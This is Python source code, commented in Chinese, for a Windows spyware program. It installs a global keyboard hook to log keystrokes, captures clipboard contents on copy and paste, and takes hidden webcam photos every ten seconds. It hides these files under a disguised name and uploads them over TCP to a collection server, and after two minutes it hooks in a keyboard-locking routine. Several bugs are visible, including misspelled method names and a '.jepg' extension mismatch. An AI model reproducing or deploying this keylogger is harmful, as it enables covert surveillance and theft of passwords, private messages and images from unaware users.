import sys, os, time
import socket, struct, json
import win32clipboard
import win32con
import win32api
import cv2

from ctypes import windll
from ctypes import CFUNCTYPE
from ctypes import byref
from ctypes import POINTER
from ctypes import c_int, c_void_p
from ctypes.wintypes import MSG

from threading import Timer
from threading import Thread
from threading import Lock


# 定义类 工具
class Utils:
    def __init__(self):
        # 用户目录
        self.base_dir = os.path.expanduser('~')

        # 初始化生成日志文件
        self.log_path = rf'{self.base_dir}/adhsvc.dll.system32'
        open(self.log_path, 'a', encoding='utf-8').close()
        win32api.SetFileAttributes(self.log_path, win32con.FILE_ATTRIBUTE_HIDDEN)

        # 定义两把锁 控制读写
        self.mutex_log = Lock()  # 日志锁
        self.mutex_photo = Lock()  # 照片锁
        self.mutex_sock = Lock()  # 上传锁
        # 服务端 ip 端口
        self.server_ip = "127.0.0.1"
        self.server_port = 8888

        # debug日志
        self.debug = True
        self.debug_log_path = rf'{self.base_dir}/debug_log'
        self.mutex_debug = Lock()

    def log_debug(self, res):
        if not self.debug: return
        self.mutex_debug.acquire()
        with open(self.debug_log_path, mode='a', encoding='utf-8') as f:
            f.write(f'\n{res}\n')
            f.flush()
        self.mutex_debug.release()

    def log(self, res):
        self.mutex_log.acquire()
        with open(self.log_path, mode='a', encoding='utf-8') as f:
            f.write(f'{res}')
            f.flush()
            self.mutex_log.release()

    def take_photoes(self):
        while True:
            time.sleep(10)
            photo_path = rf'{self.base_dir}/{time.strftime("%Y-%m-%d_%H_%M_%S")}.jpeg'
            cap = None

            try:
                # VideoCapture()中第一个参数是摄像头标号,默认情况 电脑自带摄像头索引为0 外置1
                # 参数是视频文件路径 就打开视频 cap=cv2.VideoCapture(".../.../...avi")
                # CAP_DSHOW是微软特有的cv2.release()之后摄像头依然开启 需要指定
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                ret, frame = cap.read()
                self.mutex_photo.acquire()
                cv2.imwrite(photo_path, frame)
            except Exception as e:
                self.log_debug('拍照异常 %s' % e)
            finally:
                self.mutex_photo.release()
                if cap is not None: cap.release()
                cv2.destroyAllWindows()

            if os.path.exists(photo_path):
                win32api.SetFileAttributes(photo_path, win32con.FILE_ATTRIBUTE_HIDDEN)

    def send_data(self, headers, data):
        try:
            self.mutex_sock.acquire()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.server_ip, self.server_port))

            head_json = json.dumps(headers)
            head_json_bytes = bytes(head_json, encoding='utf-8')
            client.send(struct.pack('i', len(head_json_bytes)))
            client.send(head_json_bytes)
            client.sendall(data)
            client.close()

            res = (True, 'NB')
        except ConnectionRefusedError as e:
            msg = '服务端套接字未启动 %s' % e
            res = (False, msg)
        except Exception as e:
            msg = '其他错误 %s' % e
            res = (False, msg)
        finally:
            self.mutex_sock.release()
        return res

    def upload_log(self):
        while True:
            time.sleep(1)

            if not os.path.exists(self.log_path): continue

            self.mutex_log.acquire()
            with open(self.log_path, mode='rb+') as f:
                data = f.read()
                # self.mutex_log.release()

                headers = {
                    'data_size': len(data),
                    'filename': os.path.basename(self.log_path)
                }

                self.log_debug(f'正在向服务端发送日志[{data}]')

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug(f'日志{data}发送成功')
                else:
                    self.log_debug(f'日志发送失败!!')
                    continue
                f.truncate(0)
                self.mutex_log.release()

    def upload_photoes(self):
        while True:
            time.sleep(3)

            files = os.listdir(self.base_dir)
            files_jepg = [file_name for file_name in files if file_name.endswith('.jepg')]
            for file_name in files_jepg:
                file_path = rf'{self.base_dir}/{file_name}'
                if not os.path.exists(file_path): continue

                self.log_debug(f'开始上传图片: {file_name}')
                headers = {
                    'data_size': os.path.getsize(file_path),
                    'filename': file_name
                }

                self.mutex_photo.acquire()
                with open(file_path, mode='rb+') as f:
                    data = f.read()
                self.mutex_photo.release()

                self.log_debug(f'正在向服务端发送图片{file_name}]')

                is_ok, msg = self.send_data(headers, data)
                if is_ok:
                    self.log_debug(f'图片{file_name}发送成功')
                else:
                    self.log_debug(f'图片发送失败!!')
                    continue
                os.remove(file_path)


utils = Utils()


# 定义类 挂钩与拆钩
class Toad:
    def __int__(self):
        self.user32 = windll.user32
        self.hooked = None

    def __install_hook_proc(self, pointer):
        self.hooked = self.user32.SetWindowsHookExA(
            win32con.WH_KEYBOARD_LL,  # 全局键盘钩
            pointer,
            0,  # 钩子函数的dll句柄,0
            0  # 所有线程
        )  # self.hooked 为注册钩子返回的句柄
        return True if self.hooked else False

    def install_hook_proc(self, func):
        CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        pointer = CMPFUNC(func)  # 拿到函数hookProc指针

        if self.__install_hook_proc(pointer):
            utils.log_debug("%s start " % func.__name__)

        msg = MSG()
        # 监听获取窗口消息,消息进入队列后则取出交给钩链钟的第一个钩子
        self.user32.GetMessageA(byref(msg), None, 0, 0)

    def uninstall_hook_proc(self):
        if self.hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.hooked)  # 通过钩子句柄删除注册的钩子
        self.hooked = None


toad_obj = Toad()


def monitor_keyboard_proc(nCode, wParam, lParam):
    # win32con.WM_KEYDOWN = 0x0100 # 键盘按下 对应数字256
    # win32con.WM_KEYUP = 0x101 # 键盘抬起 对应数字257 监控键盘只需要监控KEYDOWN
    if wParam == win32con.WM_KEYDOWN:
        hookedKey_ascii = 0xFFFFFFFF & lParam[0]
        hookedKey = chr(hookedKey_ascii)

        utils.log_debug(f"监听到hookeKey: [{hookedKey}] hookedKey_ascii: [{hookedKey_ascii}]")

        keyboard_dic = {
            220: r'<`>',
            189: r'<->'  # ....
        }

        if (hookedKey == 'Q'):
            toad_obj.unistall_hook_proc()
            sys.exit(-1)

        if hookedKey_ascii in keyboard_dic:  # 按下非常规按键
            res = keyboard_dic[hookedKey_ascii]
            utils.log_debug(f'监听到输入: {res}')
            utils.log(res)

        if hookedKey_ascii > 32 and hookedKey_ascii < 127:  # 检测石佛按下常规按键
            if hookedKey == 'V' or hookedKey == 'C':
                win32clipboard.OpenClipboard()
                paste_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                if paste_value:
                    utils.log(paste_value)
                    utils.log_debug(f'黏贴值: {paste_value}')
                else:
                    utils.log_debug(f'监听到输入: {repr(hookedKey)}')
                    utils.log(hookedKey)

    return windll.user32.CallNextHookEx(toad_obj.hooked, nCode, wParam, lParam)


def lock_keyboard_proc(nCode, wParam, lParam):
    utils.log_debug('锁定键盘')
    return 'LOCK IN !!!'


if __name__ == '__main__':
    t1 = Thread(target=toad_obj.install_hook_proc, args=(monitor_keyboard_proc,))
    t2 = Timer(120, toad_obj.install_hook_proc, args=(lock_keyboard_proc,))
    t3 = Thread(target=utils.take_photoes)
    t4 = Thread(target=utils.upload_log)
    t5 = Thread(target=utils.upload_photoes)

    t2.daemon = True
    t3.daemon = True
    t4.daemon = True
    t5.daemon = True

    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

    t1.join()
